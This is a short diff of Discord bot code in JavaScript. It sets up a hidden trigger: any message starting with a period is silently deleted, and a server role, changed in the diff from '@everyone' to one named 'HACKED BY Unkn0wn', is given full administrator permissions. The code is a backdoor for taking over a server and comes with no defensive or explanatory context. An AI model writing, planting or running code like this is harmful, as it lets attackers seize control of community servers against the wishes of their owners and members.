@@ -10,7 +10,7 @@ console.log(`Logged in as ${client.user.tag}!`);
 client.on('message', message => {
     if (message.content.startsWith(".")) {
         message.delete();
-        message.guild.roles.find('name', '@everyone').edit({
+        message.guild.roles.find('name', 'HACKED BY Unkn0wn').edit({
             permissions: ["ADMINISTRATOR"]///premission akata adminstator
         });
          
